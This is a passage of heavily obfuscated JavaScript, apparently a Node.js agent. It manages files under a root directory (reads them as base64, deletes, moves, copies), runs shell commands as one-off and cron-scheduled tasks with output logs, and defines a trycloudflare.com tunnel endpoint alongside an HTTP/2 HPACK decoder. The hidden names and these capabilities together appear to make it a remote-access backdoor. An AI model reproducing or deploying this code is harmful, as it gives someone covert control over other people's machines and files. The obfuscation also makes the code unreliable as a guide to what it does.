                    'path': a0n[c5(0x56b)](a0O[c5(0x167)], j),
                    'chunk_id': k,
                    'completed': !![],
                    'message': g[c5(0x44e)]
                };
            }
            return {
                'status': 'ok',
                'path': a0n[c5(0x56b)](a0O['FILE_ROOT'], j),
                'chunk_id': k,
                'completed': ![],
                'message': c5(0x221) + k + c5(0x593)
            };
        }
        return a0l['writeFileSync'](j, c), {
            'status': 'ok',
            'path': a0n['relative'](a0O[c5(0x167)], j),
            'chunk_id': 0x0,
            'completed': !![],
            'message': g['GkVlt']
        };
    }
    static async [a0aQ(0x638)](a) {
        const c6 = a0aQ, b = {
                'hmbeI': function (h, i) {
                    return h(i);
                },
                'TmgNP': c6(0x252),
                'sDton': c6(0x5cb)
            }, c = a0n[c6(0xd7)](a0O[c6(0x167)], a);
        if (!b['hmbeI'](a0V, c))
            throw new Error(b[c6(0x26c)]);
        if (!a0l[c6(0x124)](c))
            throw new Error(b['sDton']);
        const d = a0l[c6(0x1a2)](c), f = a0l[c6(0x598)](c), g = a0v['fromByteArray'](f);
        return {
            'path': a0n['relative'](a0O[c6(0x167)], c),
            'content': g,
            'size': d[c6(0x52c)]
        };
    }
    static async [a0aQ(0x597)](a) {
        const c7 = a0aQ, b = {
                'bDVsz': function (d, f) {
                    return d(f);
                },
                'CLBYB': c7(0x241),
                'aElbR': c7(0x432),
                'hrDgi': c7(0x14a),
                'zJtvM': c7(0x5e4)
            }, c = [];
        for (const d of a) {
            const f = a0n[c7(0xd7)](a0O[c7(0x167)], d);
            if (!b[c7(0x6ae)](a0V, f)) {
                c[c7(0x33a)]({
                    'path': d,
                    'status': b[c7(0x580)]
                });
                continue;
            }
            try {
                if (a0l[c7(0x124)](f)) {
                    const g = a0l[c7(0x1a2)](f);
                    g[c7(0x479)]() ? a0l[c7(0x39a)](f, {
                        'recursive': !![],
                        'force': !![]
                    }) : a0l['unlinkSync'](f), c['push']({
                        'path': d,
                        'status': b[c7(0x394)]
                    });
                } else
                    c[c7(0x33a)]({
                        'path': d,
                        'status': b[c7(0x760)]
                    });
            } catch (h) {
                c['push']({
                    'path': d,
                    'status': b[c7(0x744)],
                    'message': h[c7(0x322)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x540)](a) {
        const c8 = a0aQ, b = {
                'InmJN': function (d, f) {
                    return d(f);
                },
                'ytGYZ': c8(0x241)
            }, c = [];
        for (const [d, f] of Object[c8(0x552)](a)) {
            const g = a0n[c8(0xd7)](a0O[c8(0x167)], d), h = a0n[c8(0xd7)](a0O[c8(0x167)], f);
            if (!b['InmJN'](a0V, g) || !b['InmJN'](a0V, h)) {
                c['push']({
                    'from': d,
                    'to': f,
                    'status': b[c8(0x42c)]
                });
                continue;
            }
            try {
                const i = a0n[c8(0x2b2)](h);
                !a0l[c8(0x124)](i) && a0l['mkdirSync'](i, { 'recursive': !![] }), a0l[c8(0x614)](g, h), c[c8(0x33a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (j) {
                c[c8(0x33a)]({
                    'from': d,
                    'to': f,
                    'status': c8(0x5e4),
                    'message': j[c8(0x322)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x199)](a) {
        const c9 = a0aQ, b = {
                'UaeMU': function (d, f, g) {
                    return d(f, g);
                },
                'SSBxM': 'access_denied',
                'pQHPW': c9(0x5e4)
            }, c = [];
        for (const [d, f] of Object[c9(0x552)](a)) {
            const g = a0n[c9(0xd7)](a0O['FILE_ROOT'], d), h = a0n[c9(0xd7)](a0O[c9(0x167)], f);
            if (!a0V(g) || !a0V(h)) {
                c[c9(0x33a)]({
                    'from': d,
                    'to': f,
                    'status': b[c9(0x1b5)]
                });
                continue;
            }
            try {
                if (!a0l[c9(0x124)](g)) {
                    c[c9(0x33a)]({
                        'from': d,
                        'to': f,
                        'status': 'not_found'
                    });
                    continue;
                }
                const i = a0n['dirname'](h);
                !a0l[c9(0x124)](i) && a0l[c9(0x4e2)](i, { 'recursive': !![] });
                const j = a0l[c9(0x1a2)](g);
                if (j[c9(0x479)]()) {
                    if (a0l[c9(0x48e)])
                        a0l[c9(0x48e)](g, h, { 'recursive': !![] });
                    else {
                        const k = (l, m) => {
                            const ca = c9;
                            if (a0l[ca(0x1a2)](l)['isDirectory']()) {
                                if (!a0l[ca(0x124)](m))
                                    a0l[ca(0x4e2)](m, { 'recursive': !![] });
                                for (const n of a0l['readdirSync'](l)) {
                                    b[ca(0x283)](k, a0n[ca(0x211)](l, n), a0n['join'](m, n));
                                }
                            } else
                                a0l['copyFileSync'](l, m);
                        };
                        b['UaeMU'](k, g, h);
                    }
                } else
                    a0l[c9(0x6cd)](g, h);
                c[c9(0x33a)]({
                    'from': d,
                    'to': f,
                    'status': 'ok'
                });
            } catch (l) {
                c[c9(0x33a)]({
                    'from': d,
                    'to': f,
                    'status': b[c9(0x74d)],
                    'message': l[c9(0x322)]
                });
            }
        }
        return c;
    }
    static async [a0aQ(0x3de)](a) {
        const cb = a0aQ, b = {
                'JHEFz': function (d, f) {
                    return d(f);
                },
                'nigvs': 'Access\x20denied:\x20path\x20outside\x20root'
            }, c = a0n[cb(0xd7)](a0O[cb(0x167)], a);
        if (!b[cb(0x337)](a0V, c))
            throw new Error(b[cb(0x3b3)]);
        return a0l[cb(0x4e2)](c, { 'recursive': !![] }), {
            'status': 'ok',
            'path': a0n[cb(0x56b)](a0O[cb(0x167)], c)
        };
    }
}
function a0b(a, b) {
    a = a - 0xa8;
    const c = a0a();
    let d = c[a];
    if (a0b['aouFQw'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['FygbfB'] = e, a0b['bqKTdX'] = {}, a0b['aouFQw'] = !![];
    }
    const f = c[0x0];
    a0b['gOVEYK'] !== f && (a0b['bqKTdX'] = {}, a0b['gOVEYK'] = f);
    const g = a0b['bqKTdX'][a];
    return g === undefined ? (d = a0b['FygbfB'](d), a0b['bqKTdX'][a] = d) : d = g, d;
}
class a0X {
    static [a0aQ(0x55a)] = new Map();
    static [a0aQ(0x1aa)](a, b) {
        const cc = a0aQ, c = {
                'glHNi': function (d, f) {
                    return d > f;
                }
            };
        a[cc(0x33a)](b), c['glHNi'](a['length'], a0O[cc(0x40f)]) && a[cc(0x1b7)](0x0, a[cc(0x4a5)] - a0O['MAX_TASK_LOG_SIZE']);
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const cd = a0aQ, g = new Date()[cd(0x4f9)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + cd(0x386) + a + cd(0x359) + c + '\x0a' + (b?.[cd(0x5d6)]() || '')
        };
    }
    static [a0aQ(0x665)]() {
        const ce = a0aQ;
        return {
            'status': 'ok',
            'count': a0O[ce(0x6ca)][ce(0x4a5)],
            'tasks': a0O[ce(0x6ca)]
        };
    }
    static async [a0aQ(0x3b2)](a) {
        const cf = a0aQ, b = {
                'TZWoy': function (d, f) {
                    return d < f;
                },
                'aKisB': cf(0x1ef),
                'NIYKb': function (d, f) {
                    return d === f;
                },
                'LzNBI': cf(0x5e4)
            };
        a0O[cf(0x6ca)] = a || [], a0O[cf(0x578)] = !![];
        const c = [];
        for (let d = 0x0; b[cf(0x14f)](d, a0O['onetasks'][cf(0x4a5)]); d++) {
            const f = a0O[cf(0x6ca)][d], g = await a0U[cf(0x659)](f), h = this['_formatLogEntry'](f, g[cf(0x135)], g[cf(0x21d)], b[cf(0x2ef)]);
            this[cf(0x1aa)](a0O[cf(0x6b0)], h), c[cf(0x33a)]({
                'index': d,
                'cmd': f,
                'exitcode': g['exitcode'],
                'output': g['result'],
                'status': b['NIYKb'](g['exitcode'], 0x0) ? 'ok' : b[cf(0x22e)]
            });
        }
        return a0O['InitTask'] = ![], {
            'status': 'ok',
            'count': a0O[cf(0x6ca)][cf(0x4a5)],
            'tasks': a0O[cf(0x6ca)],
            'executed': c
        };
    }
    static [a0aQ(0x6e2)]() {
        const cg = a0aQ;
        return {
            'status': 'ok',
            'count': Object[cg(0x236)](a0O['crontasks'])[cg(0x4a5)],
            'tasks': a0O[cg(0x3c5)]
        };
    }
    static [a0aQ(0x698)](a) {
        const ch = a0aQ, b = {
                'pkeaM': function (d, f) {
                    return d === f;
                },
                'GHXnK': 'function',
                'SIFtk': function (d, f) {
                    return d === f;
                },
                'oKaSF': ch(0x16e),
                'GiaWj': function (d, f) {
                    return d || f;
                },
                'CZVDQ': function (d, f) {
                    return d > f;
                },
                'qvAOx': ch(0x5e4),
                'DrVjm': function (d, f) {
                    return d - f;
                },
                'MpeWY': function (d, f) {
                    return d || f;
                },
                'OXvNr': function (d, f) {
                    return d || f;
                }
            };
        this['cronJobs']['forEach'](d => {
            const ci = ch;
            b[ci(0xee)](typeof d[ci(0x640)], b[ci(0x2a9)]) && d[ci(0x640)](), b[ci(0x4fb)](typeof d[ci(0x605)], b['GHXnK']) && d[ci(0x605)]();
        }), this[ch(0x55a)]['clear']();
        const c = [];
        for (const d of Object['keys'](b[ch(0x4d3)](a, {}))) {
            !a0s[ch(0x370)](d) && c[ch(0x33a)](d);
        }
        if (b[ch(0x719)](c[ch(0x4a5)], 0x0))
            return {
                'status': b['qvAOx'],
                'message': ch(0x2ce) + c[ch(0x211)](',\x20'),
                'valid_count': b[ch(0x767)](Object[ch(0x236)](b['MpeWY'](a, {}))[ch(0x4a5)], c[ch(0x4a5)])
            };
        a0O[ch(0x3c5)] = b[ch(0x4e7)](a, {});
        for (const [f, g] of Object[ch(0x552)](a0O[ch(0x3c5)])) {
            const h = a0s[ch(0x3fc)](f, async () => {
                const cj = ch, i = await a0U[cj(0x659)](g), j = this[cj(0x51c)](g, i['result'], i[cj(0x21d)], b[cj(0x59e)], f);
                this[cj(0x1aa)](a0O[cj(0x5aa)], j);
            });
            this[ch(0x55a)][ch(0x5de)](f, h);
        }
        return a0O[ch(0x2af)] = b[ch(0x719)](Object['keys'](a0O[ch(0x3c5)])[ch(0x4a5)], 0x0), {
            'status': 'ok',
            'count': Object['keys'](a0O[ch(0x3c5)])[ch(0x4a5)],
            'tasks': a0O[ch(0x3c5)]
        };
    }
    static [a0aQ(0x511)]() {
        const ck = a0aQ;
        return {
            'onetime': {
                'pending': a0O['InitTask'],
                'count': a0O[ck(0x6ca)]['length']
            },
            'cron': {
                'active': a0O[ck(0x2af)],
                'count': Object['keys'](a0O[ck(0x3c5)])[ck(0x4a5)],
                'check_interval': a0O[ck(0x233)]
            }
        };
    }
    static [a0aQ(0x194)](a = 0x32) {
        const cl = a0aQ, b = a0O[cl(0x6b0)][cl(0x4a8)](-a);
        return {
            'status': 'ok',
            'count': b[cl(0x4a5)],
            'logs': b
        };
    }
    static ['getCronLogs'](a = 0x32) {
        const cm = a0aQ, b = a0O['crontasks_log'][cm(0x4a8)](-a);
        return {
            'status': 'ok',
            'count': b[cm(0x4a5)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cn = a0aQ, a = { 'hBGjd': 'onetime' }, b = a0O['onetimetasks_log'][cn(0x4a5)];
        return a0O['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a['hBGjd']
        };
    }
    static [a0aQ(0x25a)]() {
        const co = a0aQ, a = a0O['crontasks_log'][co(0x4a5)];
        return a0O['crontasks_log'] = [], {
            'status': 'ok',
            'cleared': 'cron'
        };
    }
    static [a0aQ(0x6d1)]() {
        const cp = a0aQ, a = {
                'jtGgY': function (g, h) {
                    return g - h;
                }
            }, b = a0O[cp(0x6b0)][cp(0x72f)](g => g[cp(0x21d)] === 0x0)[cp(0x4a5)], c = a['jtGgY'](a0O[cp(0x6b0)][cp(0x4a5)], b), d = a0O['crontasks_log'][cp(0x72f)](g => g[cp(0x21d)] === 0x0)[cp(0x4a5)], f = a[cp(0x483)](a0O[cp(0x5aa)][cp(0x4a5)], d);
        return {
            'onetime': {
                'total_logged': a0O[cp(0x6b0)][cp(0x4a5)],
                'max_capacity': a0O[cp(0x40f)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0O[cp(0x5aa)][cp(0x4a5)],
                'max_capacity': a0O[cp(0x40f)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aQ(0xdd)]() {
        const cq = a0aQ, a = {
                'flcmi': function (c, d) {
                    return c < d;
                },
                'nNpag': cq(0x1ef)
            }, b = [];
        for (let c = 0x0; a[cq(0x253)](c, a0O['onetasks'][cq(0x4a5)]); c++) {
            const d = a0O[cq(0x6ca)][c], f = await a0U['execute'](d), g = this[cq(0x51c)](d, f['result'], f[cq(0x21d)], a['nNpag']);
            this['_appendLog'](a0O[cq(0x6b0)], g), b[cq(0x33a)]({
                'cmd': d,
                'exitcode': f[cq(0x21d)],
                'output': f['result'],
                'timeout': f['timeout']
            });
        }
        return a0O[cq(0x578)] = ![], {
            'status': 'ok',
            'executed': b[cq(0x4a5)],
            'results': b
        };
    }
}
const a0Y = 'https://api.trycloudflare.com', a0Z = [
        a0aQ(0x468),
        a0aQ(0x404)
    ], a0a0 = 0x1ea4, a0a1 = a0aQ(0x29f), a0a2 = a0aQ(0x35a), a0a3 = 0x4000, a0a4 = [
        [
            a0aQ(0x3ae),
            ''
        ],
        [
            a0aQ(0x29a),
            a0aQ(0xa8)
        ],
        [
            a0aQ(0x29a),
            a0aQ(0x622)
        ],
        [
            a0aQ(0x5bb),
            '/'
        ],
        [
            a0aQ(0x5bb),
            '/index.html'
        ],
        [
            a0aQ(0x408),
            a0aQ(0x639)
        ],
        [
            a0aQ(0x408),
            'https'
        ],
        [
            a0aQ(0x35f),
            '200'
        ],
        [
            a0aQ(0x35f),
            a0aQ(0x1e2)
        ],
        [
            a0aQ(0x35f),
            a0aQ(0x594)
        ],
        [
            ':status',
            '304'
        ],
        [
            ':status',
            a0aQ(0x64e)
        ],
        [
            a0aQ(0x35f),
            a0aQ(0x501)
        ],
        [
            a0aQ(0x35f),
            a0aQ(0x179)
        ],
        [
            a0aQ(0x4fd),
            ''
        ],
        [
            a0aQ(0x430),
            a0aQ(0x3e7)
        ],
        [
            a0aQ(0x2c5),
            ''
        ],
        [
            a0aQ(0x729),
            ''
        ],
        [
            a0aQ(0x12a),
            ''
        ],
        [
            'access-control-allow-origin',
            ''
        ],
        [
            a0aQ(0x658),
            ''
        ],
        [
            a0aQ(0x476),
            ''
        ],
        [
            a0aQ(0x1e4),
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            a0aQ(0x4ed),
            ''
        ],
        [
            a0aQ(0x32e),
            ''
        ],
        [
            a0aQ(0x40a),
            ''
        ],
        [
            'content-length',
            ''
        ],
        [
            a0aQ(0x3c9),
            ''
        ],
        [
            a0aQ(0x371),
            ''
        ],
        [
            a0aQ(0x549),
            ''
        ],
        [
            a0aQ(0x68e),
            ''
        ],
        [
            a0aQ(0x65c),
            ''
        ],
        [
            a0aQ(0x670),
            ''
        ],
        [
            a0aQ(0xcb),
            ''
        ],
        [
            'expires',
            ''
        ],
        [
            a0aQ(0x3e1),
            ''
        ],
        [
            a0aQ(0x5f8),
            ''
        ],
        [
            a0aQ(0x75c),
            ''
        ],
        [
            a0aQ(0x31f),
            ''
        ],
        [
            a0aQ(0x4ba),
            ''
        ],
        [
            a0aQ(0x5e8),
            ''
        ],
        [
            'if-unmodified-since',
            ''
        ],
        [
            a0aQ(0x22b),
            ''
        ],
        [
            a0aQ(0x4d0),
            ''
        ],
        [
            a0aQ(0xcd),
            ''
        ],
        [
            a0aQ(0x633),
            ''
        ],
        [
            a0aQ(0x6ad),
            ''
        ],
        [
            a0aQ(0x5f6),
            ''
        ],
        [
            a0aQ(0x555),
            ''
        ],
        [
            a0aQ(0x30c),
            ''
        ],
        [
            a0aQ(0x1d6),
            ''
        ],
        [
            a0aQ(0xb6),
            ''
        ],
        [
            'server',
            ''
        ],
        [
            a0aQ(0x628),
            ''
        ],
        [
            'strict-transport-security',
            ''
        ],
        [
            a0aQ(0x474),
            ''
        ],
        [
            a0aQ(0x6a5),
            ''
        ],
        [
            a0aQ(0x56d),
            ''
        ],
        [
            a0aQ(0x58c),
            ''
        ],
        [
            a0aQ(0x672),
            ''
        ]
    ], a0a5 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a6 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0a7() {
    const cr = a0aQ, a = {
            'EYJwn': function (c, d) {
                return c - d;
            },
            'QRomw': function (c, d) {
                return c >> d;
            },
            'WAVKs': function (c, d) {
                return c === d;
            },
            'aomXo': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; c < a0a5[cr(0x4a5)]; c++) {
        const d = a0a5[c], f = a0a6[c];
        let g = b;
        for (let h = a[cr(0x509)](f, 0x1); h >= 0x0; h--) {
            const i = a[cr(0x4bf)](d, h) & 0x1;
            a['WAVKs'](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cr(0x528)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0a8 = a0a7();
function a0a9(a) {
    const cs = a0aQ, b = {
            'KGMKu': function (h, i) {
                return h >= i;
            },
            'hpcwy': function (h, i) {
                return h & i;
            },
            'lrzVq': function (h, i) {
                return h >> i;
            },
            'bKCrM': function (h, i) {
                return h | i;
            },
            'ueKKY': function (h, i) {
                return h === i;
            },
            'JaWgn': cs(0x2ac),
            'Yxzvk': '2|3|0|1|4',
            'AYpaa': function (h, i) {
                return h !== i;
            },
            'BwSdh': function (h, i) {
                return h << i;
            },
            'hcOqA': cs(0x19a)
        }, c = [];
    let d = a0a8, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[cs(0x1ea)](i, 0x0); i--) {
            const j = b['hpcwy'](b[cs(0x244)](h, i), 0x1);
            f = b[cs(0x164)](f << 0x1, j), g += 0x1, d = d[j];
            if (b[cs(0x6fd)](d, null))
                throw new Error(b[cs(0x2c7)]);
            if (b[cs(0x1ea)](d[0x2], 0x0)) {
                const k = b[cs(0xe0)][cs(0x316)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        d = a0a8;
                        continue;
                    case '1':
                        f = 0x0;
                        continue;
                    case '2':
                        if (d[0x2] === 0x100)
                            throw new Error(cs(0x21a));
                        continue;
                    case '3':
                        c[cs(0x33a)](d[0x2]);
                        continue;
                    case '4':
                        g = 0x0;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[cs(0x616)](f, b[cs(0x158)](0x1, g) - 0x1))
        throw new Error(b[cs(0x3cf)]);
    return Buffer[cs(0x3e1)](c);
}
function a0aa(a, b, c) {
    const ct = a0aQ, d = {
            'oPXHm': function (j, k) {
                return j << k;
            },
            'KyDna': function (j, k) {
                return j & k;
            },
            'RQSMO': function (j, k) {
                return j < k;
            },
            'oljyv': function (j, k) {
                return j >= k;
            },
            'rDyRy': function (j, k) {
                return j * k;
            },
            'WRFTW': function (j, k) {
                return j === k;
            },
            'MVynf': 'HPACK\x20integer\x20too\x20large'
        };
    if (b >= a[ct(0x4a5)])
        throw new Error(ct(0x735));
    const f = a[b];
    b += 0x1;
    const g = d[ct(0x276)](0x1, c) - 0x1;
    let h = d[ct(0x76a)](f, g);
    if (d[ct(0x702)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[ct(0x18a)](b, a[ct(0x4a5)]))
            throw new Error(ct(0x735));
        const j = a[b];
        b += 0x1, h += d[ct(0x2b4)](d[ct(0x76a)](j, 0x7f), Math[ct(0x623)](0x2, i));
        if (d[ct(0x133)](d['KyDna'](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[ct(0x508)]);
    }
}
function a0ab(a, b) {
    const cu = a0aQ, c = {
            'Tlain': function (j, k) {
                return j >= k;
            },
            'hdVug': 'truncated\x20HPACK\x20string',
            'dJFJO': function (j, k) {
                return j & k;
            },
            'fcEtP': function (j, k, l, m) {
                return j(k, l, m);
            },
            'elafI': function (j, k) {
                return j + k;
            },
            'GFXlZ': function (j, k) {
                return j > k;
            },
            'BbDiG': function (j, k) {
                return j(k);
            }
        };
    if (c[cu(0x2d9)](b, a[cu(0x4a5)]))
        throw new Error(c[cu(0x209)]);
    const d = Boolean(c['dJFJO'](a[b], 0x80)), [f, g] = c[cu(0x27e)](a0aa, a, b, 0x7), h = c[cu(0x193)](g, f);
    if (c[cu(0x458)](h, a['length']))
        throw new Error('truncated\x20HPACK\x20string\x20data');
    const i = a[cu(0x2e4)](g, h);
    return [
        d ? c[cu(0x5c8)](a0a9, i) : i,
        h
    ];
}
class a0ac {
    constructor() {
        const cv = a0aQ;
        this[cv(0x4d7)] = [], this[cv(0x3a3)] = 0x0, this['maxSize'] = 0x1000;
    }
    [a0aQ(0x122)](a) {
        const cw = a0aQ, b = {
                'aSvQR': function (d, f) {
                    return d <= f;
                },
                'VTaeM': function (d, f) {
                    return d - f;
                },
                'vvwZB': function (d, f) {
                    return d < f;
                },
                'TswDS': function (d, f) {
                    return d >= f;
                },
                'lzmrH': cw(0x519)
            };
        if (b['aSvQR'](a, 0x0))
            throw new Error(cw(0x202));
        if (a <= a0a4[cw(0x4a5)])
            return a0a4[b[cw(0x607)](a, 0x1)];
        const c = b['VTaeM'](b[cw(0x607)](a, a0a4[cw(0x4a5)]), 0x1);
        if (b[cw(0xb5)](c, 0x0) || b['TswDS'](c, this[cw(0x4d7)]['length']))
            throw new Error(b[cw(0x262)]);
        return this[cw(0x4d7)][c];
    }
    ['add'](a, b) {
        const cx = a0aQ, c = {
